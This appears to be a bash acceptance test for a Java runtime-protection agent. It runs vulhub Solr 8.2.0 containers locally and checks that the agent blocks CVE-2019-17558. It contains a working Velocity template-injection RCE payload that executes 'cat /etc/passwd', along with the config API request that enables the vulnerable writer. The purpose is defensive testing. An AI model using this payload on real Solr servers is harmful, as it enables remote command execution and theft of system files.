#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

baseline_name="${OHMYRASP_VULHUB_SOLR17558_BASELINE_NAME:-ohmyrasp-vulhub-solr17558-baseline}"
protected_name="${OHMYRASP_VULHUB_SOLR17558_PROTECTED_NAME:-ohmyrasp-vulhub-solr17558-protected}"
baseline_port="${OHMYRASP_VULHUB_SOLR17558_BASELINE_PORT:-18782}"
protected_port="${OHMYRASP_VULHUB_SOLR17558_PROTECTED_PORT:-18783}"
image="${OHMYRASP_VULHUB_SOLR17558_IMAGE:-vulhub/solr:8.2.0}"
baseline_dir="logs/vulhub-solr-2019-17558-java8-baseline"
protected_dir="logs/vulhub-solr-2019-17558-java8-protected"
protected_log="${protected_dir}/events.jsonl"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.json" -w "%{http_code}" \
      "http://127.0.0.1:${port}/solr/admin/cores?indexInfo=false&wt=json" \
      2>/dev/null || true)"
    if [[ "$status" == "200" ]] && grep -q '"demo"' "/tmp/${name}.json"; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose Solr demo core at ${port}" >&2
  exit 1
}

expect_protected_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 8 startup event in protected Solr container" >&2
    exit 1
  fi
  if ! grep -q '"command_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing Java 8 command hook startup marker in protected Solr container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Solr container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

enable_velocity_response_writer() {
  local port="$1"
  local output="$2"
  local body
  body='{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}'
  curl -sS -i -H 'Content-Type: application/json' --data "$body" \
    -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${port}/solr/demo/config" || true
}

velocity_payload_path() {
  python3 - <<'PY'
from urllib.parse import quote_plus

command = "cat /etc/passwd"
template = (
    "#set($x='') "
    "#set($rt=$x.class.forName('java.lang.Runtime')) "
    "#set($chr=$x.class.forName('java.lang.Character')) "
    "#set($str=$x.class.forName('java.lang.String')) "
    "#set($ex=$rt.getRuntime().exec('%s')) "
    "$ex.waitFor() "
    "#set($out=$ex.getInputStream()) "
    "#foreach($i in [1..$out.available()])"
    "$str.valueOf($chr.toChars($out.read()))#end"
) % command
print("/solr/demo/select?q=1&wt=velocity&v.template=custom&v.template.custom=" + quote_plus(template))
PY
}

send_velocity_payload() {
  local port="$1"
  local output="$2"
  local path
  path="$(velocity_payload_path)"
  curl -sS -i -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${port}${path}" || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8983" \
  "$image" >/dev/null

docker run -d --name "$protected_name" \
  -p "${protected_port}:8983" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "SOLR_OPTS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"
expect_protected_startup_without_detection

baseline_config_status="$(
  enable_velocity_response_writer "$baseline_port" "${baseline_dir}/config.response"
)"
protected_config_status="$(
  enable_velocity_response_writer "$protected_port" "${protected_dir}/config.response"
)"
if [[ "$baseline_config_status" != "200" ]] || [[ "$protected_config_status" != "200" ]]; then
  cat "${baseline_dir}/config.response" >&2 || true
  cat "${protected_dir}/config.response" >&2 || true
  echo "Solr VelocityResponseWriter config API did not return 200" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "protected Solr container produced a detection during benign Velocity config" >&2
  exit 1
fi

baseline_status="$(
  send_velocity_payload "$baseline_port" "${baseline_dir}/velocity.response"
)"
if [[ "$baseline_status" != "200" ]] \
    || ! grep -q 'root:x:0:0:' "${baseline_dir}/velocity.response"; then
  cat "${baseline_dir}/velocity.response" >&2 || true
  echo "baseline Solr Velocity payload did not execute cat /etc/passwd" >&2
  exit 1
fi

protected_status="$(
  send_velocity_payload "$protected_port" "${protected_dir}/velocity.response"
)"
if [[ "$protected_status" =~ ^2 ]] \
    || grep -q 'root:x:0:0:' "${protected_dir}/velocity.response"; then
  cat "${protected_dir}/velocity.response" >&2 || true
  echo "protected Solr Velocity payload was not blocked" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_command_execution_exploit_primitive block event for Solr Velocity RCE" >&2
  exit 1
fi

echo "vulhub Solr CVE-2019-17558 Velocity Java8 acceptance passed"
